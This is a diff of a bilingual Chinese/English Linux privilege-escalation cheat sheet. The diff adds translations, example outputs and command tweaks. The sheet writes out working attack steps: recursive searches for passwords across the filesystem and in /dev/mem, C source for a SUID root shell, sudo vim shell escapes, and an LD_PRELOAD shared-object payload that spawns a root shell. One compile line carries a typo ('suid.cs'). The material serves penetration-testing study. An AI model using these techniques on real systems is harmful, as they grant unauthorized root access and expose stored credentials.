@@ -44,6 +44,11 @@
 
 #### linux提权之前的基本判断
 
+查看管理员是否在线
+```
+w
+```
+
 虚拟机检测
 ```
 # check VM(virtual machine)
@@ -154,7 +159,10 @@ iptables -A INPUT -s 1.1.1.1 -j DROP
 # 查找包含密码的文件
 # Files containing passwords
 
-grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
+# grep命令  -I是忽略二进制文件(.so之类的)
+grep -I --exclude-dir="排除某个目录" --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
+
+# find命令
 find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
 
 # ---------------
@@ -162,8 +170,9 @@ find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
 # Last edited files
 
 # Files that were edited in the last 10 minutes
+# 最近10分钟内编辑过的文件(macOS下也可以用这条命令)
 
-find / -mmin -10 2>/dev/null | grep -Ev "^/proc"
+find / -mmin -10 2>/dev/null | grep -Ev "^/proc" | grep -Ev "^/sys"
 
 # ---------------
 # 内存中的密码
@@ -175,7 +184,7 @@ strings /dev/mem -n 10 | grep -i PASS
 # 查找敏感文件
 # Find sensitive files
 
-$ locate password | more
+$ locate password | less
 如结果
 /boot/grub/i386-pc/password.mod
 /etc/pam.d/common-password
@@ -227,6 +236,7 @@ $ locate password | more
 
 
 systemctl list-timers --all
+# 如结果
 NEXT                          LEFT     LAST                          PASSED             UNIT                         ACTIVATES
 Mon 2019-04-01 02:59:14 CEST  15h left Sun 2019-03-31 10:52:49 CEST  24min ago          apt-daily.timer              apt-daily.service
 Mon 2019-04-01 06:20:40 CEST  19h left Sun 2019-03-31 10:52:49 CEST  24min ago          apt-daily-upgrade.timer      apt-daily-upgrade.service
@@ -238,9 +248,11 @@ Mon 2019-04-01 07:36:10 CEST  20h left Sat 2019-03-09 14:28:25 CET   3 weeks 0 d
 #### SUID
 
 ```
-# SUID / Setuid代表“执行时设置用户ID”，默认情况下在每个Linux发行版中都启用。
-# 如果某个具有这个bit位的文件被运行，则uid会被属主owner改掉。 
-# 如果这个文件属主owner为`root`，即使是用户`bob`执行了这个文件，uid也将被更改为root。 SUID位被表示为`s`
+# SUID/Setuid代表 "执行时设置用户ID"
+# 它默认情况下在每个Linux发行版中都启用.
+# 如果运行某个具有这个bit位的文件,则uid将被属主owner更改掉.
+# 如果这个文件属主owner为`root`, 即使是用户`bob`执行了这个文件, uid也将被更改为root.
+# SUID bit 被表示为一个 `s`
 
 # SUID/Setuid stands for "set user ID upon execution", it is enabled by default in every Linux distributions. 
 # If a file with this bit is ran, the uid will be changed by the owner one.
@@ -249,38 +261,55 @@ Mon 2019-04-01 07:36:10 CEST  20h left Sat 2019-03-09 14:28:25 CET   3 weeks 0 d
 
 
 ╭─swissky@lab ~  
-╰─$ ls /usr/bin/sudo -alh                  
+╰─$ ls /usr/bin/sudo -alh
 -rwsr-xr-x 1 root root 138K 23 nov.  16:04 /usr/bin/sudo
 ```
 
 Find SUID binaries
 ```
-# 寻找已有SUID二进制程序
+# 寻找已有的 SUID二进制程序
 
 find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
+
+# 如结果 可见s
+-rwsr-xr-x. 1 root root 36280 11月  6 2016 /usr/sbin/unix_chkpwd
+-rwsr-xr-x. 1 root root 11296 11月  6 2016 /usr/sbin/usernetctl
+-rws--x--x. 1 root root 40312 6月  10 2014 /usr/sbin/userhelper
+-rwsr-xr-x. 1 root root 11224 11月  6 2016 /usr/sbin/pam_timestamp_check
+-rwsr-xr-x. 1 root root 78216 11月  6 2016 /usr/bin/gpasswd
+-rwsr-xr-x. 1 root root 44232 11月  6 2016 /usr/bin/mount
+-rwsr-xr-x. 1 root root 27832 6月  10 2014 /usr/bin/passwd
+...
 ```
 
 
 Create a SUID binary
 ```
-# 创建一个SUID二进制程序
+# 创建一个 SUID二进制程序
 
-print 'int main(void){\nsetresuid(0, 0, 0);\nsystem("/bin/sh");\n}' > /tmp/suid.c   
-gcc -o /tmp/suid /tmp/suid.c  
-sudo chmod +x /tmp/suid # execute right
-sudo chmod +s /tmp/suid # setuid bit
+# 有些系统没有print命令 需要自己输入
+print 'int main(void){\nsetresuid(0, 0, 0);\nsystem("/bin/sh");\n}' > /tmp/suid.c
+
+# 编译
+gcc -o /tmp/suid /tmp/suid.cs
+
+# chmod
+sudo chmod +x /tmp/suid # + 执行权限(execute right)
+sudo chmod +s /tmp/suid # + setuid bit
 ```
 
 #### Capabilities
 
 功能
 
+搜索 Linux Capabilities
+
 ```
 # ---------------
 # List capabilities of binaries
-# 列出二进制文件的功能
+# 列出二进制文件的功能 使用getcap命令
 
-
+# 靶机系统
 ╭─swissky@lab ~  
 ╰─$ /usr/bin/getcap -r  /usr/bin
 /usr/bin/fping                = cap_net_raw+ep
@@ -291,6 +320,9 @@ sudo chmod +s /tmp/suid # setuid bit
 /usr/bin/rsh                  = cap_net_bind_service+ep
 /usr/bin/rcp                  = cap_net_bind_service+ep
 
+# 正常系统
+[root@xx opt]# getcap -r /usr/bin
+/usr/bin/ping = cap_net_admin,cap_net_raw+p
 
 # ---------------
 # Edit capabilities
@@ -304,16 +336,17 @@ sudo chmod +s /tmp/suid # setuid bit
 # Interesting capabilities
 # 有趣的功能
 
-# Having the capability =ep means the binary has all the capabilities.
-# capability = ep 意味着这个二进制文件具有所有功能。
-
+#【注意】=ep
+# Having the capability =ep means the binary has ALL the capabilites permitted (p) and effective (e) from the start.
+#  `=ep` 意味着这个二进制文件具有所有功能. 从一开始就具有所有允许的(p)和有效的(e)的功能.
 
 $ getcap openssl /usr/bin/openssl 
 如结果
 openssl=ep
 
+# ---------------
 # Alternatively the following capabilities can be used in order to upgrade your current privileges.
-# 或者可以使用以下功能来升级当前权限
+# 或者可以使用以下功能(capabilities) 来升级你的当前权限
 
 cap_dac_read_search # read anything
 cap_setuid+ep # setuid
@@ -334,7 +367,7 @@ uid=0(root) gid=1000(swissky)
 
 NOPASSWD
 
-```
+```shell
 # Sudo configuration might allow a user to execute some command with another user privileges without knowing the password.
 # Sudo配置可能允许用户在不知道密码的情况下使用其他用户权限执行某些命令。
 
@@ -353,17 +386,18 @@ sudo vim -c '!sh'
 sudo -u root vim -c '!sh'
 ```
 
-
 LD_PRELOAD and NOPASSWD
 
-```
+```shell
 # If LD_PRELOAD is explicitly defined in the sudoers file
 # 如果在sudoers文件中显式定义了 LD_PRELOAD 如下
 Defaults        env_keep += LD_PRELOAD
 
 # 使用以下命令 编译c代码
 gcc -fPIC -shared -o shell.so shell.c -nostartfiles
+```
 
+```c
 # shell.c
 
 #include <stdio.h>
@@ -375,8 +409,9 @@ void _init() {
 	setuid(0);
 	system("/bin/sh");
 }
+```
 
-
+```shell
 # Execute any binary with the LD_PRELOAD to spawn a shell : 
 # 使用LD_PRELOAD执行任何二进制文件 以派生得到shell：
 
